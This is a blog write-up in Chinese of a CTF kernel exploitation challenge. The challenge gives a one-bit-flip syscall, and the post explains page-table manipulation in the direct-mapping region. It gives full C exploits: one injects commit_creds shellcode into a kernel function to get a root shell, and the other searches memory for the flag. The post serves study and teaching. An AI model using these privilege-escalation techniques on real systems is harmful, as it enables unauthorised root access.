---
layout: post
title: Midnight Sun CTF 2025 Final - flop
tags: pwn kernel
---

## 题目分析

由于在网上搜不到题目附件，不得不手动搭了一个环境，内核版本为 `6.12.27`，关闭 `KASLR`、`KPTI` 保护。

题目添加了一个自定义的系统调用：

```c
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/pgtable.h>

#DEFINE SYS_FLOP 468

static atomic_t bit_flipped = ATOMIC_INIT(0);

SYSCALL_DEFINE2(flop, unsigned long, addr, int, bit_pos)
{
    unsigned long *target;

    if (atomic_cmpxchg(&bit_flipped, 0, 1) != 0)
        return -EPERM;

    if (bit_pos < 0 || bit_pos >= 64)
        return -EINVAL;

    if (addr < 0x1000)
        return -EINVAL;

    if (addr > __pa(high_memory))
        return -EINVAL;

    if (addr & 7)
        return -EINVAL;

    target = (unsigned long *)__va(addr);

    if (!(*target & _PAGE_PRESENT) && (*target != 0))
        return -EINVAL;

    *target ^= (1UL << bit_pos);
    __flush_tlb_all();

    return 0;
}
```

总结来说，这个系统调用允许攻击者在满足下列条件的情况下，有一次翻转一个 bit 的机会：
- 地址范围在 `0x1000` ~ `high_memory` 且向 8 对齐
- 目标地址的值要么是 `0` 要么最低位为 `1` （即 `_PAGE_PRESENT`）

`high_memory` 是一个用来标识直接映射区顶端的变量，这里就是在暗示我们攻击直接映射区的内存。另外代码中出现了 `_PAGE_PRESENT`、`__flush_tlb_all`，显然是在暗示我们修改页表（修改页表作为一种攻击手法，是本博客的老熟人了，详见 [GhostWrite #2: 漏洞利用代码分析](https://www.cameudis.com/2025/01/06/GhostWrite-2.html#%E4%BB%BB%E6%84%8F%E8%AF%BB%E6%94%BB%E5%87%BB)）。

## 利用

一个页表项的结构大致如下（这是最后一级 Page Table Entry 的格式，但其他几级也差不多，可见 linux 源码 `/arch/x86/64/include/paging_definitions.h`）：

```c
typedef struct
{
  uint64 present                   :1;
  uint64 writeable                 :1;
  uint64 user_access               :1;
  uint64 write_through             :1;
  uint64 cache_disabled            :1;
  uint64 accessed                  :1;
  uint64 dirty                     :1;
  uint64 size                      :1;
  uint64 global                    :1;
  uint64 ignored_2                 :3;
  uint64 page_ppn                  :28;
  uint64 reserved_1                :12; // must be 0
  uint64 ignored_1                 :11;
  uint64 execution_disabled        :1;
} __attribute__((__packed__)) PageTableEntry;
```

其中，`writeable` 和 `user_access` 比较重要，前者标记页面是否可写，后者标记页面是否可以在用户态被访问。在一次虚拟地址转化为物理地址的过程中，会涉及到多层的页表，只要其中有一层的权限要求不满足，就会触发 page fault。

### 方法1：劫持内核代码

我们可以修改页表，那么首先就可以考虑注入恶意代码，此在 [HITCTF 2023 xv6-Trusted](https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted.html) 中亦有记载。为了让恶意代码在内核态被执行，我们可以挑选一个内核中的函数进行劫持，然后从用户态触发这个函数的调用。由于题目没有开启 KPTI 保护（这一点很关键！），我们可以在劫持页表权限后，直接从用户态攻击内核的代码段。

不妨就以 `__x64_sys_flop` 为目标，尝试把其代码覆盖掉。为此，我们需要获取其地址以及各级对应的页表（这里用到的 `va2pa` 函数在文末附上了）：

```
(qemu) gef➤  x/i __x64_sys_flop 
   0xffffffff810a4070 <__x64_sys_flop>: endbr64
(qemu) gef➤  va2pa 0xffffffff810a4070
pml4e: 0x0000000001e2f067 at 0x03778ff8
pdpte: 0x0000000001e30063 at 0x01e2fff0
pde  : 0x00000000010001a1 at 0x01e30040
phy  : 0x10a4070 [0x01000000-0x011fffff]
```

> Q：为什么这里只有三级而不是四级页表？
> A：PDE 的第 7 位为 1，表明这是一个 2MB 大页描述符，没有第四级页表。

注意到，这里 `pdpte` 的配置是用户不可读、内核可读写；`pde` 的配置是用户不可读、内核可读。因此，如果想在用户态写入 `__x64_sys_flop`，一共需要修改三个 bits，分别使 `pdpte` 变成用户可访问、`pde` 变成用户可访问和可写入。我们具备的条件不足以修改三个 bits，因此这条路行不通。

好在，我们知道这个函数除了在内核代码映射区内会被映射，还会同时存在于线性映射区域（直接映射区域）。从上可知 `__x64_sys_flop` 的物理地址是 `0x10a4070`，对应直接映射区地址是 `0xffff8880010a4070`，我们再来解析一下这个虚拟地址：

```
(qemu) gef➤  va2pa 0xffff8880010a4070
pml4e: 0x0000000002201067 at 0x03778888
pdpte: 0x0000000002202067 at 0x02201000
pde  : 0x80000000010001a1 at 0x02202040
phy  : 0x10a4070 [0x01000000-0x011fffff]
```

可以看到，这次我们需要修改 `pde` 的两个比特才能将这个映射变成用户可写。聪明的内核开发者对直接映射区做了保护，把里面属于代码的部分标记成不可写了！但是没关系，我们考虑 `pde` 本身，其作为数据（而非代码）也会在线性映射区中存在一个映射，而数据的映射则大概率是 `rw` 的：

```
(qemu) gef➤  va2pa 0xffff888002202040
pml4e: 0x0000000002201067 at 0x03778888
pdpte: 0x0000000002202067 at 0x02201000
pde  : 0x80000000022001e3 at 0x02202088
phy  : 0x2202040 [0x02200000-0x023fffff]
```

可以看到，这里确实只需要修改一个比特就可以从用户劫持了。由此我们得到了完整的攻击流程：

1. 利用题目给出的条件，攻击目标（`__x64_sys_flop`） 在线性映射区的映射的 `pde` 部分在线性映射区的映射（也就是 `pde` 的 `pde`，套娃），将目标的 `pde` 变成用户可访问；
2. 从用户态直接攻击目标在线性映射区映射的 `pde`，将目标变为用户可访问、可写；
3. 从用户态直接劫持目标函数；
4. 触发目标函数的调用。

攻击代码如下：

```c
#include "kernelpwn.h"

#define INIT_CRED "0xffffffff81e3ab80"
#define COMMIT_CREDS "0xffffffff810a02f0"

void rootkit();
asm(
    "rootkit:"
    "mov rdi, 0xffffffff81e3ab80;"
    "mov rax, 0xffffffff810a02f0;"
    "call rax;"
    "ret;"
);
void rootkit_end() { return; }

int main()
{
    // high_memory: 0xffff88800ffe0000
    // range: 0x1000 ~ 0xffe0000

    // __x64_sys_flop 0xffff8880010a4070
    //   corresponding pte addr: 0x02202040 (v: 0xffff888002202040)
    //   ^ corresponding pte addr: 0x02202088 (v: 0xffff888002202088)

    syscall(468, 0x2202088, 2);

    uint64_t* flop_pte = (uint64_t*)0xffff888002202040;
    *flop_pte |= 6;
    // sched_yield();

    void* flop = (void*)0xffff8880010a4070;
    memcpy(flop, rootkit, rootkit_end - rootkit);

    int r = syscall(468);
    printf("[*] syscall return: %d\n", r);

    system("/bin/sh"); // BOOM!

    return 0;
}
```

如果题目没有开启 `SMAP` 保护的话，现在我们已经成功拿到 shell 了。不过，如果此时开启了 `SMAP`，有几率会在内核处理 `system("/bin/sh")` 或更之后的时候发生 panic，报错大致如下：

```
BUG: unable to handle page fault for address: ffff888002363000
#PF: supervisor read access in kernel mode
#PF: error_code(0x0001) - permissions violation
PGD 2201067 P4D 2201067
```

这是因为我们把直接映射区的两个大页改成了用户可访问，内核去读写那里的数据时，就会被 `SMAP` 拦下。解决方法就是在攻击完毕之后进行清理，只需要在最后的 `system` 前添加下面这两行代码即可：

```c
    // recover page table
    *flop_pte ^= 6;
    *(uint64_t*)0xffff888002202088 ^= 4;
```

就可以成功拿到 flag：

```sh
~ $ ./exp
[*] syscall return: 0
~ # id
uid=0(root) gid=0(root)
~ # cat /flag
flag{你怎么知道cameudis有对象了?}
```

> 注：有一次调试的时候遇到了挫折（如下图所示，发现直接映射区缺了一块映射），本来以为是内核做了保护把代码段除外了，后来发现疑似是自己 exp 写得有点烂，把页表搞得乱七八糟导致的（）
> 
> ![](https://blog-1308958542.cos.ap-shanghai.myqcloud.com/20251010204440251.png)
> 
> 所以内核是不是可以做一个保护把代码段直接不映射？

### 方法2：搜索 ramdisk 中的 flag 文件

由于题目给出的 flag 直接存在于 ramdisk 里，因此也会被加载到内存中。我们可以先在调试环境搜索到 flag 的位置，然后在脚本中暴力搜索周围的内存空间。虽然 flag 的位置有随机性，但由于线性映射区都是大页映射，因此我们可以在修改完 1 个比特之后就开始搜索大页，甚至也可以使用类似于方法 1 中的套娃技巧，将控制范围再度扩大。

> 不过由于笔者还没装好 [Kernel特化版gef](https://github.com/bata24/gef)（这玩意一键安装脚本只支持 debian 系是什么鬼？），默认的 gef 又没办法在 qemu 模式下搜索内存，这种方法就先咕咕咕了！

```
gef> search-pattern "flag{"
[+] Searching for 'flag{' in whole memory
[+] In (0xffff888002200000-0xffff888002600000 [rw-] (0x400000 bytes)
  0xffff888002251000:    66 6c 61 67 7b e4 bd a0  e6 80 8e e4 b9 88 e7 9f    |  flag{...........  |
[+] In (0xffffffff82200000-0xffffffff82400000 [rw-] (0x200000 bytes)
  0xffffffff82251000:    66 6c 61 67 7b e4 bd a0  e6 80 8e e4 b9 88 e7 9f    |  flag{...........  |
gef> va2pa 0xffff888002251000
pml4e: 0x0000000002201067 at 0x03730888
pdpte: 0x0000000002202067 at 0x02201000
pde  : 0x80000000022001e3 at 0x02202088
phy  : 0x2251000 [0x02200000-0x023fffff]
gef> va2pa 0xffffffff82251000
pml4e: 0x0000000001e2f067 at 0x03730ff8
pdpte: 0x0000000001e30063 at 0x01e2fff0
pde  : 0x80000000022001e3 at 0x01e30088
phy  : 0x2251000 [0x02200000-0x023fffff]
```

我们使用高级 gef 进行搜索，可以看到 flag 即出现于线性映射区，也出现于另外一个区域。但是如果解析其页表的话，就会发现线性映射区的那个地址只需要我们修改一个 bit 就可以从用户态进行读取了，范围为 `0x02200000-0x023fffff`。

可以快速写出一个攻击与搜索脚本：

```c
/*
 * exp2.c
 * Copyright (C) 2025 y2 <cameudis@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */

#include "kernelpwn.h"

int main() {
    int r = syscall(468, 0x2202088, 2);
    printf("[*] syscall return: %d\n", r);

    uint64_t a;
    for (a = 0xffff888002200000; a < 0xffff8880023fffff; a++) {
        if (strncmp((char*)a, "flag{", 5) == 0) {
            printf("[*] found flag string at: %p\n", (void*)a);
            break;
        }
    }

    printf("[*] flag: %s\n", (char*)a);

    return 0;
}
```

---

## 附录

简陋的 va2ga gdb 脚本（只支持 linux x64 4级页表映射）：

```gdb
define phy4pxe
    if $argc != 1
        printf "Usage: phy4pxe <pml4e|pdpte|pde|pte>\n"
    else 
        set $mask40 = (((unsigned long)1 << 40)-1)
        set $result = (($arg0 >> 12) & $mask40) << 12
    end
end

define va2pa
    set $directmappingbase = 0xffff888000000000
    set $target = 0xffff888000000000
    set $mask9  = ((1 << 9) - 1)
    set $mask12 = ((1 << 12) - 1)
    set $mask21 = ((1 << 21) - 1)
    set $mask30 = ((1 << 30) - 1)
    set $mask40 = (((unsigned long)1 << 40) - 1)

    if $argc >= 1
        set $target = $arg0
    end

    phy4pxe $cr3
    set $pml4ephy = $result + (($target >> 39) & $mask9) * 8
    set $pml4e = *(unsigned long*)($directmappingbase + $pml4ephy)
    printf "pml4e: 0x%016lx at 0x%08x\n", $pml4e, $pml4ephy

    phy4pxe $pml4e
    set $pdptephy = $result + (($target >> 30) & $mask9) * 8
    set $pdpte = *(unsigned long*)($directmappingbase + $pdptephy)
    printf "pdpte: 0x%016lx at 0x%08x\n", $pdpte, $pdptephy

    phy4pxe $pdpte
    if (($pdpte >> 7) & 1) == 0
        set $pdephy = $result + (($target >> 21) & $mask9) * 8
        set $pde = *(unsigned long*)($directmappingbase + $pdephy)
        printf "pde  : 0x%016lx at 0x%08x\n", $pde, $pdephy

        phy4pxe $pde
        if (($pde >> 7) & 1) == 0
            set $ptephy = $result + (($target >> 12) & $mask9) * 8
            set $pte = *(unsigned long*)($directmappingbase + $ptephy)
            printf "pte  : 0x%016lx at 0x%08x\n", $pte, $ptephy

            phy4pxe $pte
            set $res_mask = $mask12
        else
            set $res_mask = $mask21
        end
    else
        set $res_mask = $mask30
    end

    printf "phy  : 0x%lx [0x%08x-0x%08x]\n", $result + ($target & $res_mask), $result, $result + $res_mask
end
```
